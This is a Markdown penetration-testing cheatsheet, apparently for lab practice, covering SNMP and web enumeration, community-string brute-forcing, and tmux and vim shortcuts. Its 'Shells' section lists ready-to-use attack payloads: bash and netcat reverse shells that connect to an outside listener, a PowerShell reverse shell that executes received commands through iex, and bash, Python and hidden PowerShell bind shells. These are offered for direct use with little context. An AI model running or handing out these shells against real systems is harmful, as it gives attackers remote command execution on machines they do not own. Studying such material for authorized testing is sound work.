# Cheatsheet

## Table of Contents
- [Enumeration](#enumeration)
    - [Nmap](#nmap)
    - [SNMP](#snmp)
- [Web Enumeration](#web-enumeration)
    - [Banner Grabbing](#banner-grabbing)
    - [gobuster](#gobuster)
    - [whatweb](#whatweb)
- [Shells](#shells)
    - [Reverse Shells](#reverse-shells)
    - [Bind Shells](#bind-shells)
- [Other](#other)
    - [Network](#network)
    - [Tmux](#tmux)
    - [Vim](#vim)

## Enumeration

### Nmap

Find scripts for a service:  
`locate scripts/<service-name>`

Cross reference service versions with changelogs to find OS version (not necessarily correct)

### SNMP

Default community strings of `public` and `private` are often unchanged

SNMP version 1 and 2c controls access with plaintext community strings

We can dump useful information from process parameters like credentials, routing information,
services bound to additional interfaces, and the version of installed software

```bash
# OIDs will be displayed after executing snmpwalk
# -v: version of SNMP, 1.3.6.1.2.1.1.5.0: OID for string
snmpwalk -v 2c -c public 10.10.10.1 1.3.6.1.2.1.1.5.0

# bruteforce community string names with onesixtyone
onesixtyone -c dict.txt 10.10.10.1
```

## Web Enumeration

### Banner grabbing

```bash
# netcat
nc 10.10.0.1 22

# curl
curl -IL https://10.10.10.1
```

### gobuster

```bash
# directory enumeration
gobuster dir -u http://10.10.10.1/ -w /usr/share/dirb/wordlistts/common.txt

# DNS enumeration
gobuster dns -d google.com -w /usr/share/seclists/Discovery/DNS/namelist.txt
```

### whatweb

Extract the version of web servers, supporting frameworks, and applications

```bash
whatweb 10.10.10.1
```

### Certificates

View SSL/TLS certificates of HTTPS websites for information on the target organization

### Robots.txt

Navigate to /robots.txt to find potential targets

## Shells

### Upgrading TTY

### Reverse Shells

Bash

```bash
# tcp
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

# nc pipe
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

PowerShell

```powershell
# TCP client to IEX
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

### Bind Shells

Bash

```bash
# nc pipe
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Python

```python
# socket listener to subprocess
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")
```

PowerShell
```powershell
# socket listener to IEX
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Other

### Network

Ports cheatsheets:
- https://www.stationx.net/common-ports-cheat-sheet/
- https://packetlife.net/media/library/23/common-ports.pdf
- https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/

View accessible networks:  
`netstat -rn`

### Tmux

Command prefix: `Ctrl + b`  
New window: prefix, `c`  
Split vertically: prefix, `Shift + %`  
Split horizontally: prefix, `Shift + "`  
Switch: prefix, `up/down/left/right arrow`  

### Vim

| Command | Description |
|---------|-------------|
| x | Cut char |
| dw | Cut word |
| dd | Cut line |
| yw | Copy word |
| yy | Copy line |
| p | Paste |
| :1 | Go to line 1 |